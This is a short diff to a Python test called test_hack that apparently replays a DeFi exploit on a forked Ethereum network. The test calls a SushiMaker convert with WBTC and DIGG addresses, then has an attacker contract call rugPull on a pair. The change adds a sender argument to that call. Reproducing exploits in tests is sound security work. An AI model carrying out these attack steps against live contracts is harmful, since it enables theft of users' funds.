@@ -41,7 +41,7 @@ def test_hack(eth_fork_network, brownie_project):
 
     sushi_maker.convert(wbtc_addr, digg_addr, {'from': attacker_eoa.address})
 
-    attacker_contract.rugPull(digg_weth_pair.address, wbtc_addr)
+    attacker_contract.rugPull(digg_weth_pair.address, wbtc_addr, {'from': attacker_eoa})
 
     attacker_end_balance = attacker_eoa.balance()
 
